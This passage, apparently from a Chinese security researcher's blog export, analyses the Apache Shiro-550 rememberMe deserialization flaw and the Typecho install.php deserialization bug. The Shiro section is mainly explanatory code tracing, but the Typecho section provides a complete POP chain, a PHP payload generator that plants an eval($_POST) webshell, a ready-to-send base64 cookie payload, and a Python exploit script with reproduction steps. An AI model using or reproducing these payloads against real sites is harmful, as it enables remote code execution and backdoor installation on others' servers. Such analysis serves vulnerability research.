将加密后的数据进行base64编码 发送 rememberMe cookie 因此对应服务端的反序列化逻辑推测应该是： 接受 rememberMe cookie -&gt; base64 解码 -&gt; AES 解密 -&gt; 触发反序列化 所以分析的重点就在 rememberMe 的生成和 服务端反序列化这里 加密流程在一个正常的登录过程中，开启 Remember Me 时。若成功登录会触发 AbstractRememberMeManager#onSuccessfulLogin 分析入口点 AbstractRememberMeManager#onSuccessfulLogin public void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) { this.forgetIdentity(subject); if (this.isRememberMe(token)) { this.rememberIdentity(subject, token, info); } else if (log.isDebugEnabled()) { log.debug(&quot;AuthenticationToken did not indicate RememberMe is requested. RememberMe functionality will not be executed for corresponding account.&quot;); }} 关键点1: org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin 和 org.apache.shiro.mgt.AbstractRememberMeManager#isRememberMe 判断是否启用了 Remember Me 功能 principals 对象在 org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity 创建 principals 的值 关键点2：序列化、加密对象 依次看一下序列化这一步的步骤 // org.apache.shiro.mgt.AbstractRememberMeManager.convertPrincipalsToBytesprotected byte[] convertPrincipalsToBytes(PrincipalCollection principals) { byte[] bytes = this.serialize(principals);// org.apache.shiro.mgt.AbstractRememberMeManager.serializeprotected byte[] serialize(PrincipalCollection principals) { return this.getSerializer().serialize(principals);}// org.apache.shiro.io.DefaultSerializer#serializepublic byte[] serialize(T o) throws SerializationException { if (o == null) { String msg = &quot;argument cannot be null.&quot;; throw new IllegalArgumentException(msg); } else { ByteArrayOutputStream baos = new ByteArrayOutputStream(); BufferedOutputStream bos = new BufferedOutputStream(baos); try { ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(o); oos.close(); return baos.toByteArray(); } catch (IOException var6) { String msg = &quot;Unable to serialize object [&quot; + o + &quot;]. &quot; + &quot;In order for the DefaultSerializer to serialize this object, the [&quot; + o.getClass().getName() + &quot;] &quot; + &quot;class must implement java.io.Serializable.&quot;; throw new SerializationException(msg, var6); } }}// org.apache.shiro.subject.SimplePrincipalCollection#writeObjectprivate void writeObject(ObjectOutputStream out) throws IOException { out.defaultWriteObject(); boolean principalsExist = !CollectionUtils.isEmpty(this.realmPrincipals); out.writeBoolean(principalsExist); if (principalsExist) { out.writeObject(this.realmPrincipals); }} 最后是在 org.apache.shiro.io.DefaultSerializer#serialize 的 toByteArray 返回的字节码 再依次看一下加密这一步的步骤 在看这个之前需要先看当前类的构造方法 设置 AES 的各个信息 org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherService 进入加密步骤 第一部分 // org.apache.shiro.mgt.AbstractRememberMeManager.convertPrincipalsToBytesprotected byte[] convertPrincipalsToBytes(PrincipalCollection principals) { if (this.getCipherService() != null) { bytes = this.encrypt(bytes); }}/** org.apache.shiro.mgt.AbstractRememberMeManager#encrypt* 后面先进入 this.getCipherService(); 的分析*/protected byte[] encrypt(byte[] serialized) { byte[] value = serialized; CipherService cipherService = this.getCipherService(); return value;}// org.apache.shiro.mgt.AbstractRememberMeManager#getCipherServicepublic CipherService getCipherService() { return this.cipherService;}/* * org.apache.shiro.mgt.AbstractRememberMeManager * 这个是在该类调用构造方法初始化的时候就附值的*/public abstract class AbstractRememberMeManager implements RememberMeManager { private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;); private CipherService cipherService = new AesCipherService();// org.apache.shiro.crypto.AesCipherServicepublic class AesCipherService extends DefaultBlockCipherService { private static final String ALGORITHM_NAME = &quot;AES&quot;; public AesCipherService() { super(&quot;AES&quot;); }}// org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherServicepublic DefaultBlockCipherService(String algorithmName) { super(algorithmName); this.modeName = OperationMode.CBC.name(); this.paddingSchemeName = PaddingScheme.PKCS5.getTransformationName(); this.blockSize = 0; this.streamingModeName = OperationMode.CBC.name(); this.streamingPaddingSchemeName = PaddingScheme.PKCS5.getTransformationName(); this.streamingBlockSize = 8;}/** org.apache.shiro.mgt.AbstractRememberMeManager#encrypt* 运行刚刚这个类的后半部分* 这里 cipherService 确定了加密类型等*/protected byte[] encrypt(byte[] serialized) { if (cipherService != null) { ByteSource byteSource = cipherService.encrypt(serialized, this.getEncryptionCipherKey()); value = byteSource.getBytes(); } return value;} 这里先看 getEncryptionCipherKey 方法的调用 /** org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey* 这里的 this.encryptionCipherKey 是之前类初始化的时候就定义的*/public byte[] getEncryptionCipherKey() { return this.encryptionCipherKey;}/** 回顾类的初始化* org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager* 注意 DEFAULT_CIPHER_KEY_BYTES，其实是之前 private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;); 已经硬编码好的。 这是漏洞的根源*/public AbstractRememberMeManager() { this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);}// org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKeypublic void setCipherKey(byte[] cipherKey) { this.setEncryptionCipherKey(cipherKey); this.setDecryptionCipherKey(cipherKey);}// org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKeypublic void setEncryptionCipherKey(byte[] encryptionCipherKey) { this.encryptionCipherKey = encryptionCipherKey;} 第二部分 然后是 encrypt 方法 （核心 AES 加密） 传入的两个参数一个是刚刚在 org.apache.shiro.io.DefaultSerializer#serialize 的 toByteArray 返回的字节码。另一个就是 AES KEY 后面的就是 AES 加密的过程， 最后会返回一个 bytes 第三部分 /** 返回 org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity* bytes 返回两个参数经过 encrypt 加密的值*/protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) { byte[] bytes = this.convertPrincipalsToBytes(accountPrincipals); this.rememberSerializedIdentity(subject, bytes);}/** org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity* base64 加密* 设置 cookie */protected void rememberSerializedIdentity(Subject subject, byte[] serialized) { if (!WebUtils.isHttp(subject)) { ······ } else { HttpServletRequest request = WebUtils.getHttpRequest(subject); HttpServletResponse response = WebUtils.getHttpResponse(subject); String base64 = Base64.encodeToString(serialized); Cookie template = this.getCookie(); Cookie cookie = new SimpleCookie(template); cookie.setValue(base64); cookie.saveTo(request, response); }} 完成了 序列化对象 -&gt; AES 加密 -&gt; Base64 加密 -&gt; 设置 cookie 值 的过程 解密流程POC 生成：https://github.com/P2hm1n/vulnExploit/blob/main/shiro_rememberMe_generate.py 从 POC 的触发来看解密流程 // org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentityprotected PrincipalCollection getRememberedIdentity(SubjectContext subjectContext) { RememberMeManager rmm = this.getRememberMeManager(); if (rmm != null) { try { return rmm.getRememberedPrincipals(subjectContext); ···/** 上面 return 调用 org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals*/public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) { PrincipalCollection principals = null; try { byte[] bytes = this.getRememberedSerializedIdentity(subjectContext);/** 上面调用 org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity*/protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { ··· String base64 = this.getCookie().readValue(request, response);/** 上面调用 org.apache.shiro.web.servlet.SimpleCookie#readValue* 关键函数 readValue 返回 rememberMe 的 POC 值*/public String readValue(HttpServletRequest request, HttpServletResponse ignored) { // 获取到了传入的 cookie 的名字 name: &quot;rememberMe&quot; String name = this.getName(); String value = null; // 这里获取到 rememberMe 对应的值 javax.servlet.http.Cookie cookie = getCookie(request, name); if (cookie != null) { value = cookie.getValue(); log.debug(&quot;Found &apos;{}&apos; cookie value [{}]&quot;, name, value); } else { log.trace(&quot;No &apos;{}&apos; cookie value&quot;, name); } // 返回 rememberMe 的值 return value;}/** 跳回 org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity* 关键点：会进行base64解码*/protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { ··· if (&quot;deleteMe&quot;.equals(base64)) { return null; } else if (base64 != null) { // 确实是否是base64 base64 = this.ensurePadding(base64); ··· byte[] decoded = Base64.decode(base64); ··· return decoded; } else { return null; } } }}/** 跳回 org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals* 此时已经将 base64 进行了解码*/public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) { ··· principals = this.convertBytesToPrincipals(bytes, subjectContext);/** 调用 org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals*/protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) { if (this.getCipherService() != null) { bytes = this.decrypt(bytes); }/** 调用 org.apache.shiro.mgt.AbstractRememberMeManager#decrypt* 关键点： 进行 AES 解密， 并返回解密值*/protected byte[] decrypt(byte[] encrypted) { byte[] serialized = encrypted; CipherService cipherService = this.getCipherService(); if (cipherService != null) { ByteSource byteSource = cipherService.decrypt(encrypted, this.getDecryptionCipherKey()); serialized = byteSource.getBytes(); } return serialized;}/** 返回 org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals* 此处调用 deserialize*/protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) { ··· return this.deserialize(bytes);}/** 调用 org.apache.shiro.mgt.AbstractRememberMeManager#deserialize*/protected PrincipalCollection deserialize(byte[] serializedIdentity) { return (PrincipalCollection)this.getSerializer().deserialize(serializedIdentity);}/** 调用 org.apache.shiro.io.DefaultSerializer#deserialize* 最终关键点：进行反序列化*/public T deserialize(byte[] serialized) throws SerializationException { if (serialized == null) { String msg = &quot;argument cannot be null.&quot;; throw new IllegalArgumentException(msg); } else { ByteArrayInputStream bais = new ByteArrayInputStream(serialized); BufferedInputStream bis = new BufferedInputStream(bais); try { ObjectInputStream ois = new ClassResolvingObjectInputStream(bis); T deserialized = ois.readObject(); ois.close(); return deserialized; } catch (Exception var6) { String msg = &quot;Unable to deserialze argument byte array.&quot;; throw new SerializationException(msg, var6); } }}} 以下是几个关键点截图： 漏洞修复https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848 硬编码 -&gt; 随机值 利用限制、坑点及思考为什么 100key 能用各种 shiro exploit 似乎都在集成一个爆破 key 的功能。但是根据漏洞可以看出 1.2.4 的 key 是硬编码的，然后 1.2.5 之后变成了随机值。key 值爆破似乎跟两个版本没有什么关系。 对 shiro 的了解和研究并不深刻，这个问题的答案来源于：关于Shiro反序列化漏洞的延伸—升级shiro也能被shell 可能性1：有其他开源框架整合了shiro，并且有这样一段配置文件，大家就都直接用了。 可能性2：因为这种代码都是互相抄来抄去的，在博客里，教程里，github里有这个代码，开发直接拿过来用。 Forexampe: ShiroConfig /** * cookie管理对象 * @return */public CookieRememberMeManager rememberMeManager() { CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager(); cookieRememberMeManager.setCookie(rememberMeCookie()); // rememberMe cookie加密的密钥 cookieRememberMeManager.setCipherKey(Base64.decode(&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;)); return cookieRememberMeManager;} 为什么有的链打不了这个在身边的 @p1g3 和 @l3yx 的博客中都阐述的很详细了。 简而言之就是 org.apache.shiro.io.DefaultSerializer#deserialize 中调用 的 ClassResolvingObjectInputStream 重写了 resolveClass public T deserialize(byte[] serialized) throws SerializationException { if (serialized == null) { String msg = &quot;argument cannot be null.&quot;; throw new IllegalArgumentException(msg); } else { ByteArrayInputStream bais = new ByteArrayInputStream(serialized); BufferedInputStream bis = new BufferedInputStream(bais); try { ObjectInputStream ois = new ClassResolvingObjectInputStream(bis); T deserialized = ois.readObject(); ois.close(); return deserialized; } catch (Exception var6) { String msg = &quot;Unable to deserialze argument byte array.&quot;; throw new SerializationException(msg, var6); } }}} 看一下 org.apache.shiro.io.ClassResolvingObjectInputStream 是怎么写的 //// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package org.apache.shiro.io;import java.io.IOException;import java.io.InputStream;import java.io.ObjectInputStream;import java.io.ObjectStreamClass;import org.apache.shiro.util.ClassUtils;import org.apache.shiro.util.UnknownClassException;public class ClassResolvingObjectInputStream extends ObjectInputStream { public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException { super(inputStream); } protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException { try { return ClassUtils.forName(osc.getName()); } catch (UnknownClassException var3) { throw new ClassNotFoundException(&quot;Unable to load ObjectStreamClass [&quot; + osc + &quot;]: &quot;, var3); } }} Compare to java.io.ObjectInputStream#resolveClass public Class&lt;?&gt; resolveClass(ObjectStreamClass objectStreamClass) throws IOException, ClassNotFoundException { String name = objectStreamClass.getName(); try { return Class.forName(name, false, latestUserDefinedLoader()); } catch (ClassNotFoundException e) { ClassNotFoundException classNotFoundException = e; Class&lt;?&gt; cls = primClasses.get(name); if (cls != null) { return cls; } throw classNotFoundException; }} Shiro 中使用了 ClassUtils.forName 而原生的使用的 Class.forName 具体区别跟进 ClassUtils.forName public static Class forName(String fqcn) throws UnknownClassException { Class clazz = THREAD_CL_ACCESSOR.loadClass(fqcn); if (clazz == null) { if (log.isTraceEnabled()) { log.trace(&quot;Unable to load class named [&quot; + fqcn + &quot;] from the thread context ClassLoader. Trying the current ClassLoader...&quot;); } clazz = CLASS_CL_ACCESSOR.loadClass(fqcn); } if (clazz == null) { if (log.isTraceEnabled()) { log.trace(&quot;Unable to load class named [&quot; + fqcn + &quot;] from the current ClassLoader. &quot; + &quot;Trying the system/application ClassLoader...&quot;); } clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn); } if (clazz == null) { String msg = &quot;Unable to load class named [&quot; + fqcn + &quot;] from the thread context, current, or &quot; + &quot;system/application ClassLoaders. All heuristics have been exhausted. Class could not be found.&quot;; throw new UnknownClassException(msg); } else { return clazz; }} 直观可以看到的是里面大多采用了 loadClass 来加载。至于使用其加载类有什么弊端可以看 @p1g3 这段话 ClassLoader.loadClass的方式并不支持加载数组类，这也是为什么cc没法用的原因，当然这部分我并没有深入分析，因为其涉及到了Java中一种叫”双亲委派”的类加载思路 &amp; 突破”双亲委派”的思路，这部分和漏洞无关 此时我们则无法使用任何带数组对象的gadget，而cc3.2.1中的所有链（在官方仓库内的）都需要用到数组对象transformer，所以需要重新构造链，用其他链来打。 大概小结： Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。 至于 ClassLoader.loadClass 是不是所有 class 都无法加载？ 参考下一小标题 延伸 - resovleClass 的数组类加载在 P牛圈子中有个师傅文章 看到了这一点，对于上一个小标题中总结的 ClassLoader.loadClass不支持装载数组类型的class 有了全新的看法。 [Ljava.lang.StackTraceElement 数组类加载 先留个坑，CC调完回来写 JRMP 攻击 优点 不需要依赖 缺点 JEP290（受限 JDK 版本）: https://paper.seebug.org/454/ 需要出网 分析思考匆匆分析完了 Shiro550。除了加解密流程跟 POC 的编写外似乎并没有分析太多东西。由于对 AES 的理解不足直接在加解密过程中直接忽略了 AES 的具体步骤。感觉这样浅尝辄止的分析不是太好。因此在下一次分析的时候要具体细化一下。 前文中提到了 resovleClass 对 Shiro 利用链的限制，那么什么链可以使用，该如何去构造新的链，是我们值得深思的问题。先留个坑，准备去理一下 CommonsCollections gadget chain Shiro-721 PaddingOracle CBC AttackShiro-721 PaddingOracle CBC Attack 个人总结漏洞原理以下几点： rememberMe 加解密原理 Shiro 1.4.1及其之前版本的Cookie中的rememberMe字段是使用AES-128-CBC模式来加密生成的 限制： Apache Shiro &lt;= 1.4.1 需要有正常用户登录的 Cookie rememberMe 涉及到密码算法，且实际利用有限。不在本文分析范围 Referencehttps://l3yx.github.io/ https://payloads.info/2020/06/23/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/","link":"/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"Typecho 反序列化漏洞分析","text":"Typecho 反序列化漏洞分析和一些坑点 漏洞概述 Typecho是一个简单，轻巧的博客程序。基于PHP，使用多种数据库（Mysql，PostgreSQL，SQLite）储存数据。在GPL Version 2许可证下发行，是一个开源的程序，目前使用SVN来做版本管理。 触发点在 ./install.php 。是一个反序列化导致的任意代码执行，从而实现前台 getshell。 受影响版本：GitHub上2017年10月24日之前的所有版本。 漏洞分析漏洞触发点在 ./install.php。定位敏感函数 unserialize。这里其实定位到了两个有关利用点，但是其实只有第一处能够利用。相关代码在 231-237行 &lt;?php$config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));Typecho_Cookie::delete(&apos;__typecho_config&apos;);$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);Typecho_Db::set($db);寻找unserialize函数中变量是否可控。可见先经过一次 base64_decode 函数解码，然后调用的是 Typecho_Cookie 类下的get方法。 public static function get($key, $default = NULL){ $key = self::$_prefix . $key; $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default); return is_array($value) ? $default : $value;} 关键点在 value 附值处。可见设定了两个三元运算符进行嵌套, 通过 $_COOKIE 和 $_POST 对其附值。可见这里我们可以直接通过 POST 方法来控制 key 的变量，从而控制 value 。 现在我们已经拥有了反序列化的点(unserialize),和我们的可控变量（$_POST 对__typecho_config 附值）。 思考：我们通过反序列化得到了什么？——》 $config变量的可控性。 紧接着体现 $config 变量可控性的地方在 $db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);。 程序通过 Typecho_Db 进行了实例化。跟进方法 &lt;?phpclass Typecho_Db{ public function __construct($adapterName, $prefix = &apos;typecho_&apos;) { /** 获取适配器名称 */ $this-&gt;_adapterName = $adapterName; /** 数据库适配器 */ $adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName; if (!call_user_func(array($adapterName, &apos;isAvailable&apos;))) { throw new Typecho_Db_Exception(&quot;Adapter {$adapterName} is not available&quot;); } $this-&gt;_prefix = $prefix; /** 初始化内部变量 */ $this-&gt;_pool = array(); $this-&gt;_connectedPool = array(); $this-&gt;_config = array(); //实例化适配器对象 $this-&gt;_adapter = new $adapterName(); }} 关键代码为 $adapterName = &apos;Typecho_Db_Adapter_&apos; . $adapterName;， 这里进行了一个字符串的拼接。且 adapterName 是我们可控的。如果我们传入一个类，PHP就会做一个从类到字符串的强制类型转换。由此会触发那个类的 toString 方法。 我们目前的利用链为: install.php 反序列化导致$config 变量可控 ——&gt; Cookie.php 中.拼接导致强制类型转换触发传入类 __tostring 方法。 接着我们就开始寻找我们可利用的 tostring 方法。一共三处，我们可以利用的只有 var/Typecho/Feed.php 一处。截取部分代码 class Typecho_Feed{ private $_items = array(); /** * $item的格式为 * &lt;code&gt; * array ( * &apos;title&apos; =&gt; &apos;xxx&apos;, * &apos;content&apos; =&gt; &apos;xxx&apos;, * &apos;excerpt&apos; =&gt; &apos;xxx&apos;, * &apos;date&apos; =&gt; &apos;xxx&apos;, * &apos;link&apos; =&gt; &apos;xxx&apos;, * &apos;author&apos; =&gt; &apos;xxx&apos;, * &apos;comments&apos; =&gt; &apos;xxx&apos;, * &apos;commentsUrl&apos;=&gt; &apos;xxx&apos;, * &apos;commentsFeedUrl&apos; =&gt; &apos;xxx&apos;, * ) * &lt;/code&gt; * * @access public * @param array $item * @return unknown */ public function addItem(array $item) { $this-&gt;_items[] = $item; } # ~ ~ ~ ~ ~ ~ 省略部分代码 foreach ($this-&gt;_items as $item) { $content .= &apos;&lt;item&gt;&apos; . self::EOL; $content .= &apos;&lt;title&gt;&apos; . htmlspecialchars($item[&apos;title&apos;]) . &apos;&lt;/title&gt;&apos; . self::EOL; $content .= &apos;&lt;link&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/link&gt;&apos; . self::EOL; $content .= &apos;&lt;guid&gt;&apos; . $item[&apos;link&apos;] . &apos;&lt;/guid&gt;&apos; . self::EOL; $content .= &apos;&lt;pubDate&gt;&apos; . $this-&gt;dateFormat($item[&apos;date&apos;]) . &apos;&lt;/pubDate&gt;&apos; . self::EOL; $content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL; 关键点在 290行， $content .= &apos;&lt;dc:creator&gt;&apos; . htmlspecialchars($item[&apos;author&apos;]-&gt;screenName) . &apos;&lt;/dc:creator&gt;&apos; . self::EOL; ，这里我们可控 $item[&apos;author&apos;]。当他被设置一个类，且从不可访问的属性screenName读取数据时，会调用 __get 方法。 我们目前的利用链为: install.php 反序列化导致$config 变量可控 ——&gt; Cookie.php 中.拼接导致强制类型转换触发传入类 __tostring 方法。——&gt; Feed.php 中控制 $item[&apos;author&apos;] 去触发传入类的 __get 方法。 接着我们开始寻找 __get 方法。找到我们可以利用的文件 Request.php class Typecho_Request{ public function __get($key) { return $this-&gt;get($key); }}跟进里面调用的 get 函数 class Typecho_Request{ public function get($key, $default = NULL) { switch (true) { case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset(self::$_httpParams[$key]): $value = self::$_httpParams[$key]; break; default: $value = $default; break; } $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_applyFilter($value); } 最后 return 返回值经过了 _applyFilter 处理，跟进 _applyFilter class Typecho_Request{ private function _applyFilter($value) { if ($this-&gt;_filter) { foreach ($this-&gt;_filter as $filter) { $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); } $this-&gt;_filter = array(); }发现敏感函数: call_user_func 。且 $filter通过 private $_filter = array(); + foreach ($this-&gt;_filter as $filter) 得到，$filter可控。$value 通过 _params[$key]间接得到，所以也是可控的。 由此完成了我们的POP链 但在到达反序列化利用点（unserialize函数）之前，代码进行了两个限制。大概功能在注释中也写的清楚明了了。 //判断是否已经安装if (!isset($_GET[&apos;finish&apos;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &apos;/config.inc.php&apos;) &amp;&amp; empty($_SESSION[&apos;typecho&apos;])) { exit;}// 挡掉可能的跨站请求if (!empty($_GET) || !empty($_POST)) { if (empty($_SERVER[&apos;HTTP_REFERER&apos;])) { exit; } $parts = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]); if (!empty($parts[&apos;port&apos;])) { $parts[&apos;host&apos;] = &quot;{$parts[&apos;host&apos;]}:{$parts[&apos;port&apos;]}&quot;; } if (empty($parts[&apos;host&apos;]) || $_SERVER[&apos;HTTP_HOST&apos;] != $parts[&apos;host&apos;]) { exit; }}针对第一点: 通过GET传参 finish 就能绕过； 针对第二点： refer来自本站即可 最后有一个坑来自于 install.php 最开头的 ob_start();。 @LoRexxar师傅提到 因为我们上面对象注入的代码触发了原本的exception，导致ob_end_clean()执行，原本的输出会在缓冲区被清理。 我们必须想一个办法强制退出，使得代码不会执行到exception，这样原本的缓冲区数据就会被输出出来。 这里有两个办法。 1、因为call_user_func函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。 2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。 同时 @pupiles 师傅也在blog中指出，由于调用了ob_end_clean方法清空了缓冲区。导致没有回显，但是php还是可以成功执行的，可以直接通过 file_put_contents 写入shell 解决了这个问题，整个利用ROP链就成立了 最终POP链为:install.php 中的 unserialize反序列化可控 $config 值导致的 $config[&apos;adapter&apos;]可控。——》Db.php 中进行PHP类型强制转换，触发 $config[&apos;adapter&apos;]可控类的 __tostring 方法——》Feed.php 中 __tostring 方法内调用可控制类从不可访问的属性读取数据$item[&apos;author&apos;]-&gt;screenName) 触发 __get方法——》Request.php 中 __get方法调用 get 方法，调用 _applyFilter方法中 的 call_user_func，控制其内两个参数实现命令执行 其实光看POP链不怎么复杂，但是里面每一步构造，每一个方法的尝试调用都是要经过很多次的跟进和分析的。 编写 POC &amp; EXP顺着 @pupiles 师傅 bypass ob_start() 的思路写的POC。但是使用 @pupiles 师傅blog中的 POC 可能有一点小问题。由于PHP中双引号具有解析效果，这里的 POST 会被解析，最终写入的 webshell 的代码为 &lt;?php @eval()?&gt; 因此改良POC如下 &lt;?php//编写最后 call_user_func 函数利用的类class Typecho_Request{ private $_filter = array(); private $_params = array(); public function __construct(){ $this-&gt;_filter[0] = &apos;assert&apos;; //采用传统回调利用，call_user_func + assert $this-&gt;_params[&apos;screenName&apos;] = &apos;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\\$_POST[P2hm1n]); ?&gt;&quot;)&apos;; //bypass ob_start()限制 }}class Typecho_Feed{ const RSS2 = &apos;RSS 2.0&apos;; private $_type; private $_items = array(); public function __construct(){ $this-&gt;_type = self::RSS2; $this-&gt;_items[0] = array( &apos;author&apos; =&gt; new Typecho_Request(), ); }}$final = new Typecho_Feed();$poc = array( &apos;adapter&apos; =&gt; $final, &apos;prefix&apos; =&gt; &apos;typecho_&apos;);echo urlencode(base64_encode(serialize($poc)));?&gt; 还有一种办法就是利用造成一个报错来构造POC。核心代码如下 public function __construct(){ $this-&gt;_type = $this::RSS2; $this-&gt;_items[0] = array( &apos;category&apos; =&gt; array(new Typecho_Request()), &apos;author&apos; =&gt; new Typecho_Request(), ); } 最后简单的exp编写如下，没有对url做细致的处理。异常处理也不够细致。 import requestsurl = &apos;http://typecho/&apos;def exp(url): if &quot;http//&quot; or &quot;https://&quot; in url: url = url else: url = &apos;http://&apos; + url target = url + &apos;/install.php?finish&apos; fakerefer = url + &apos;/install.php&apos; payload = &apos;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCJzaGVsbC5waHAiLCAiPD9waHAgQGV2YWwoXCRfUE9TVFtQMmhtMW5dKTsgPz4iKSI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ%3D%3D&apos; headers = { &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&apos;, &apos;Referer&apos;: fakerefer, &apos;cookie&apos;: payload } try: html = requests.get(url=target, headers=headers, timeout=5) if html.status_code == 404: return &apos;no install.php&apos; else: print(&apos;mkdir:./shell.php, shell_password=P2hm1n&apos;) except: print(&apos;something wrong&apos;)if __name__ == &apos;__main__&apos;: exp(url) 漏洞复现首先正常安装 typecho，本地环境 MacOS + MAMP PRO(PHP7.3.9+Mysql5.7) 安装过程中需要自己去数据库里新建一个空数据库，安装过程并不会帮助你新建一个空的数据库然后写入数据。 访问 url 为 http://typecho/install.php?finish。 refer设置根据自身情况改变 POST参数如下__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCJzaGVsbC5waHAiLCAiPD9waHAgQGV2YWwoXCRfUE9TVFtQMmhtMW5dKTsgPz4iKSI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ%3D%3D 即可在当前目录下生成 shell.php 文件，密码为 P2hm1n 参考链接https://lihuaiqiu.github.io/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/https://paper.seebug.org/424/","link":"/2020/03/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"网鼎杯线下半决赛 faka 